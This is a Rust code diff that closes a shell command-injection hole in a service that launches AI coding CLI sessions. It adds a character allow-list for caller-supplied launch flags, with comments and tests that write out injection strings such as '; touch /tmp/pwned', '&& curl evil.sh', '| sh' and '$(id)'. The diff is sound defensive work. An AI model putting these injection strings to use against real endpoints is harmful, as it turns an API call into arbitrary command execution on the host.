@@ -639,6 +639,54 @@ fn valid_provider(provider: &str) -> bool {
     PROVIDERS.contains(&provider)
 }
 
+/// Characters a launch-flags string may contain, beyond ASCII letters and
+/// digits. Everything else — quotes, `;`, `&`, `|`, backtick, `$`, `(`, `)`,
+/// `<`, `>`, `\`, `*`, `?`, newline, and every non-ASCII byte — is refused.
+///
+/// The allowed set is what real launch flags are made of: the switch itself
+/// (`--permission-mode`), its value (`bypassPermissions`, `opus`), a path
+/// (`--add-dir /srv/app`, `--mcp-config ./mcp.json`), a `key=value`
+/// (`--setting model=opus`), a list (`a,b`), a version (`gpt-5-codex`), and the
+/// spaces between them.
+const FLAG_EXTRA_CHARS: &[char] = &[' ', '-', '_', '.', '/', '=', ':', ',', '+', '@', '%'];
+
+/// The first character of `flags` that is not launch-flag material, if any.
+fn offending_flag_char(flags: &str) -> Option<char> {
+    flags
+        .chars()
+        .find(|c| !c.is_ascii_alphanumeric() && !FLAG_EXTRA_CHARS.contains(c))
+}
+
+/// Reject a caller-supplied launch-flags string that carries shell
+/// metacharacters (SEC-01).
+///
+/// WHY THIS IS A BOUNDARY CHECK. `flags` is stored verbatim and later spliced
+/// into the launch line that is TYPED INTO THE PANE'S SHELL
+/// (`lifecycle::build_launch_command`). Before this check,
+/// `flags: "--version >/dev/null; touch /tmp/pwned; claude"` ran `touch` in the
+/// pane as the service user — an authenticated caller could turn "create a
+/// session" into "run this command on the host", which is a privilege the API
+/// never meant to hand out (the web client sends a typed `bypass_permissions`
+/// boolean and never raw flags).
+///
+/// The 400 NAMES the offending character, because "invalid flags" on a string
+/// the caller composed by hand is unactionable. The second layer —
+/// `lifecycle::quoted_flag_words` — quotes whatever is stored anyway, so a row
+/// written before this check existed is also inert.
+fn validate_flags(flags: &str) -> Result<(), AppError> {
+    match offending_flag_char(flags) {
+        None => Ok(()),
+        Some(c) => Err(AppError::BadRequest(format!(
+            "invalid launch flags: {c:?} is not allowed (flags are spliced into the launch \
+             command line; allowed: letters, digits, space and {})",
+            FLAG_EXTRA_CHARS
+                .iter()
+                .filter(|c| **c != ' ')
+                .collect::<String>()
+        ))),
+    }
+}
+
 /// Fresh per-session hook token: 32 bytes from the OS CSPRNG, base64url.
 pub(crate) fn gen_hook_token() -> String {
     let mut buf = [0u8; 32];
@@ -862,6 +910,10 @@ pub struct CreateInput {
     pub provider: Option<String>,
     #[serde(default)]
     pub creator: Option<String>,
+    /// Extra provider CLI flags for this session's launch line, e.g.
+    /// `--model opus`. Charset-restricted by [`validate_flags`]: it ends up on a
+    /// command line that a shell parses, so anything shell-meta is a 400 naming
+    /// the character (SEC-01).
     #[serde(default)]
     pub flags: Option<String>,
     #[serde(default)]
@@ -881,7 +933,8 @@ pub struct CreateInput {
     /// Boot Claude in bypass-permissions mode (`--permission-mode
     /// bypassPermissions`). A typed boolean — the server builds the trusted flag
     /// string, so the web never puts raw text on the `claude` command line
-    /// (`flags` is interpolated unquoted into the launch line). Composes with the
+    /// (`flags` is spliced into the launch line — charset-checked by
+    /// [`validate_flags`] and quoted again at render). Composes with the
     /// runtime Shift+Tab mode toggle (same `BYPASS_FLAG`), so a session created
     /// this way reads as `bypass` and the toggle round-trips.
     #[serde(default)]
@@ -962,10 +1015,16 @@ pub async fn create(state: &AppState, input: CreateInput) -> Result<SessionView,
         .filter(|d| !d.is_empty())
         .unwrap_or_else(|| name.clone());
     // Build the per-session launch flags. The web sends a typed `bypass_permissions`
-    // boolean (never raw flags — `flags` is interpolated unquoted into the launch
-    // line); the trusted `BYPASS_FLAG` is appended here so the session boots in
-    // bypass mode and the runtime mode toggle round-trips on it.
+    // boolean (never raw flags); the trusted `BYPASS_FLAG` is appended here so the
+    // session boots in bypass mode and the runtime mode toggle round-trips on it.
+    //
+    // The caller's half is validated FIRST (SEC-01): `flags` is spliced into the
+    // launch command line, so a shell metacharacter in it is a command-execution
+    // primitive, not a bad string. Checked before the trusted flag is appended so
+    // the 400 only ever talks about what the caller actually sent, and before the
+    // DB write so a poisoned value never becomes a stored row.
     let mut flags = input.flags.unwrap_or_default();
+    validate_flags(&flags)?;
     if input.bypass_permissions.unwrap_or(false) && !flags.contains(lifecycle::BYPASS_FLAG) {
         flags = format!("{flags} {}", lifecycle::BYPASS_FLAG)
             .trim()
@@ -2247,6 +2306,87 @@ mod tests {
         ok.runtime = Some("native".into());
         create(&state, ok).await.expect("native without a host is fine");
         crate::sessions::native::forget("remote-nat");
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    /// SEC-01 — the charset rule itself. Pure, so it is pinned without a DB.
+    #[test]
+    fn flag_validation_names_the_offending_character() {
+        // Every flags value this repo stores, plus the ordinary user-typed
+        // shapes, must pass — the check may not break a single existing row.
+        for ok in [
+            "",
+            "--yolo",
+            "--ask-for-approval never",
+            lifecycle::BYPASS_FLAG,
+            "--model opus",
+            "--model claude-opus-5",
+            "--add-dir /opt/projects/supermux",
+            "--mcp-config ./mcp.json",
+            "--setting model=opus",
+            "--permission-mode bypassPermissions --model opus",
+        ] {
+            assert!(validate_flags(ok).is_ok(), "{ok:?} must stay creatable");
+        }
+        // The shell-meta surface, refused one character at a time.
+        for (bad, ch) in [
+            ("--version; touch /tmp/pwned", ';'),
+            ("--version && curl evil.sh", '&'),
+            ("--version | sh", '|'),
+            ("--model $(id)", '$'),
+            ("--model `id`", '`'),
+            ("--version >/dev/null", '>'),
+            ("--model <x", '<'),
+            ("--model 'opus'", '\''),
+            ("--model \"opus\"", '"'),
+            ("--model o\\ pus", '\\'),
+            ("--dir *", '*'),
+            ("--version\ntouch /tmp/pwned", '\n'),
+        ] {
+            let err = validate_flags(bad)
+                .expect_err(&format!("{bad:?} carries a shell metacharacter — must be refused"));
+            assert!(matches!(err, AppError::BadRequest(_)), "{err:?}");
+            // The message NAMES the character — the caller composed this string
+            // by hand and "invalid flags" would not tell them which byte to drop.
+            assert!(
+                err.to_string().contains(&format!("{ch:?}")),
+                "the 400 for {bad:?} must name {ch:?}: {err}",
+            );
+        }
+    }
+
+    /// SEC-01 end to end at the HTTP boundary: the documented exploit body is a
+    /// 400 and writes NO row, so the payload never reaches a launch line at all.
+    #[tokio::test]
+    async fn create_refuses_flags_that_carry_shell_metacharacters() {
+        let (state, dir) = test_state().await;
+        let mut inp = input("pwn");
+        inp.flags = Some("--version >/dev/null; touch /tmp/pwned; claude".into());
+        let err = create(&state, inp).await.expect_err("must refuse");
+        assert!(matches!(err, AppError::BadRequest(_)), "{err:?}");
+        assert!(err.to_string().contains("launch flags"), "{err}");
+        assert!(!db::sessions::exists(&state.pool, "pwn").await.unwrap());
+
+        // The refusal is about the METACHARACTERS, not about sending flags: the
+        // same request with a real flags value creates and stores them verbatim.
+        let mut ok = input("fine");
+        ok.flags = Some("--model opus".into());
+        create(&state, ok).await.expect("a plain flags value is fine");
+        let row = db::sessions::get(&state.pool, "fine").await.unwrap().unwrap();
+        assert_eq!(row.flags, "--model opus");
+
+        // And the typed bypass boolean still appends the trusted flag on top of
+        // a caller-supplied one (the composition `create` has always done).
+        let mut both = input("both");
+        both.flags = Some("--model opus".into());
+        both.bypass_permissions = Some(true);
+        create(&state, both).await.expect("create");
+        let row = db::sessions::get(&state.pool, "both").await.unwrap().unwrap();
+        assert_eq!(row.flags, format!("--model opus {}", lifecycle::BYPASS_FLAG));
+
+        for n in ["fine", "both"] {
+            crate::sessions::native::forget(n);
+        }
         let _ = std::fs::remove_dir_all(dir);
     }
 
